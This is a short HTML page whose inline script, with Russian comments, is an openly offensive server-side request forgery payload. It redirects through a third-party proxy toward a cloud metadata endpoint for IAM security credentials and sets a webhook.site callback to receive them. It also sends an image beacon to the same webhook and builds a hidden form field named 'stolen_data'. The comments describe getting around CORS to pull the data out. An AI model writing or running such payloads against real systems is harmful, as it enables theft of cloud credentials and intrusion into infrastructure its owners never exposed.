<!DOCTYPE html>
<html>
<body>
    <script>
        const hook = "https://webhook.site/db69ae80-4433-4821-8c44-090b6df24af8";
        const proxy = "https://max.ru/proxy?url=";
        const target = "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/default";

        // Вместо fetch используем форму. Формы не боятся CORS!
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = hook; // Шлем всё сразу на вебхук

        // Пытаемся засунуть результат прокси в скрытое поле
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'stolen_data';
        
        // Магия: пытаемся заставить прокси сделать редирект на твой вебхук с данными
        window.location.href = proxy + encodeURIComponent(target + "?callback=" + hook);

        // Если через 2 секунды редирект не сработал, пробуем вытащить через ошибку картинки
        setTimeout(() => {
            const img = new Image();
            img.src = hook + "?final_attempt=true&check_manual_proxy=1";
        }, 2000);
    </script>
</body>
</html>
